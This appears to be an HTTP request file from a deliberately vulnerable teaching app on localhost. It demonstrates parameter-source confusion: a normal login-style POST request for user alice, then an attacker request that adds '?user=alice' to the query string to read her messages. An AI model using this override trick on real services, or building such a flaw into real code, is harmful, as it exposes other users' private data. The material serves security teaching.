# Regular requests would pass credentials solely via POST body:
POST http://localhost:8000/vuln/confusion/parameter-source/example7
Content-Type: application/x-www-form-urlencoded

user=alice&password=123456

# And as usual, Alice would get her *own* messages:
#
# [
#  {
#    "from": "kevin",
#    "message": "Hi Alice, you're fired!"
#  }
# ]
#

###

# Attacker can get Alice's messages by adding user=alice to the query string:
POST http://localhost:8000/vuln/confusion/parameter-source/example7?user=alice
